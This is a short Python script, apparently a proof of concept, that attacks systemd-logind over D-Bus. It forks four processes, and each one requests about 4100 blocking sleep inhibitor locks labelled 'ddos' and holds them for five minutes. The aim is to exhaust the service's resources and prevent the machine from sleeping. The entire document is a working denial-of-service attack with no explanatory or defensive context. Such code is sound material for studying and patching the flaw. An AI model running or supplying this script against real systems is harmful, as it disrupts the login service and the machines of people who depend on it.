import os, sys, dbus
from resource import *
from time import sleep

def trace(msg):
    print("[%d] %s" % (os.getpid(), msg))

def loop():
    setrlimit(RLIMIT_NOFILE, (4096, 4096))
    bus = dbus.SystemBus()
    mgr = bus.get_object("org.freedesktop.login1", "/org/freedesktop/login1")
    mgr = dbus.Interface(mgr, "org.freedesktop.login1.Manager")
    fds = []
    for i in range(4100):
        try:
            fd = mgr.Inhibit("sleep", "bleh", "ddos", "block")
            trace("inhibit #%d as %r" % (i, fd))
            fds.append(fd)
        except Exception as e:
            trace("error: %r" % e)
    trace("done, sleeping for 5 minutes")
    sleep(5*60)

for i in range(4):
    if os.fork() == 0:
        loop()
        sys.exit()

while os.wait():
    pass
